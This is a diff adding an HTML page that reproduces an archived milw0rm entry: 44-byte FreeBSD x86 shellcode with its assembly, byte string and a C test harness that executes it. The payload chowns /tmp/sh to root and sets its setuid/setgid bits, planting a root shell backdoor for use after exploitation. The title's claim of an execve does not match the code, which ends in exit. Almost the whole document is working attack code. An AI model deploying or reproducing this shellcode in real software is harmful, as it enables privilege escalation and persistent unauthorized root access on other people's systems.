@@ -1,0 +1,88 @@
+<html><head><title>freebsd/x86 chown 0:0 , chmod 6755 & execve /tmp/sh 44 bytes</title></head><pre>/*
+ * FreeBSD shellcode
+ * chown(&quot;/tmp/sh&quot;, 0, 0); chmod(&quot;/tmp/sh&quot;, 06755);
+ * 44 bytes
+ * 
+ * Claes M. Nyberg 20020209
+ *
+ * &lt;cmn@darklab.org&gt;, &lt;md0claes@mdstud.chalmers.se&gt;
+ */
+
+/*************************************************************
+void
+main(void)
+{
+__asm__(&quot;
+          xor      %eax, %eax      # eax = 0 
+          pushl    %eax            # string ends with NULL 
+          pushl    $0x68732f2f     # push 'hs//' (//sh) 
+          pushl    $0x706d742f     # push 'pmt/' (/tmp) 
+          movl     %esp, %ebx      # ebx = &amp;string[0]  
+          push     %eax            # 0 
+          push     %eax            # 0 
+          push     %ebx            # /tmp/sh 
+          push     %eax            # Dummy 
+          mov      $0x10, %al      # eax = 16 = chown 
+          int      $0x80           # chown(/tmp/sh, 0, 0); 
+          xor      %eax, %eax      # eax = 0
+          or       $0xded, %ax     # eax = 06755
+          pushl    %eax            # 06755 
+          push     %ebx            # /tmp/sh 
+          pushl    %eax            # dummy 
+          xor      %eax, %eax      # eax = 0
+          mov      $0xf, %al       # eax = 15 = chmod 
+          int      $0x80           # chmod(/tmp/sh, 06755); 
+          mov      $0x1, %al       # eax = 1 = exit
+		  push     %eax            # exit value = 1
+          push     %eax            # Dummy
+          int      $0x80           # exit(1);
+    &quot;);
+}
+
+*************************************************************/
+
+#include &lt;stdio.h&gt;
+#include &lt;string.h&gt;
+
+static char freebsd_code[] =
+		&quot;\x31\xc0&quot;              /* xor      %eax, %eax  */
+		&quot;\x50&quot;                  /* pushl    %eax        */
+		&quot;\x68\x2f\x2f\x73\x68&quot;  /* pushl    $0x68732f2f */
+		&quot;\x68\x2f\x74\x6d\x70&quot;  /* pushl    $0x706d742f */
+		&quot;\x89\xe3&quot;              /* movl     %esp, %ebx  */
+		&quot;\x50&quot;                  /* pushl    %eax        */
+		&quot;\x50&quot;                  /* pushl    %eax        */
+		&quot;\x53&quot;                  /* pushl    %ebx        */
+		&quot;\x50&quot;                  /* pushl    %eax        */
+		&quot;\xb0\x10&quot;              /* mov      $0x10, %al  */
+		&quot;\xcd\x80&quot;              /* int      $0x80       */
+		&quot;\x31\xc0&quot;              /* xor      %eax, %eax  */
+		&quot;\x66\x0d\xed\x0d&quot;      /* or       $0xded, %ax */
+		&quot;\x50&quot;                  /* pushl    %eax        */
+		&quot;\x53&quot;                  /* push     %ebx        */
+		&quot;\x50&quot;                  /* pushl    %eax        */
+		&quot;\x31\xc0&quot;              /* xor      %eax, %eax  */
+		&quot;\xb0\x0f&quot;              /* mov      $0xf, %al   */
+		&quot;\xcd\x80&quot;              /* int      $0x80       */
+        &quot;\xb0\x01&quot;              /* mov      $0x1, %al   */
+        &quot;\x50&quot;                  /* push     %eax        */
+        &quot;\x50&quot;                  /* push     %eax        */
+        &quot;\xcd\x80&quot;;             /* int      $0x80       */
+
+static char _freebsd_code[] =
+        &quot;\x31\xc0\x50\x68\x2f\x2f\x73\x68&quot;
+        &quot;\x68\x2f\x74\x6d\x70\x89\xe3\x50&quot;
+        &quot;\x50\x53\x50\xb0\x10\xcd\x80\x31&quot;
+        &quot;\xc0\x66\x0d\xed\x0d\x50\x53\x50&quot;
+        &quot;\x31\xc0\xb0\x0f\xcd\x80\xb0\x01&quot;
+        &quot;\x50\x50\xcd\x80&quot;;
+
+void
+main(void)
+{
+    void (*code)() = (void *)_freebsd_code;
+    printf(&quot;strlen code: %d\n&quot;, strlen(freebsd_code));
+    code();
+}
+
+// milw0rm.com [2004-09-26]</pre></html>
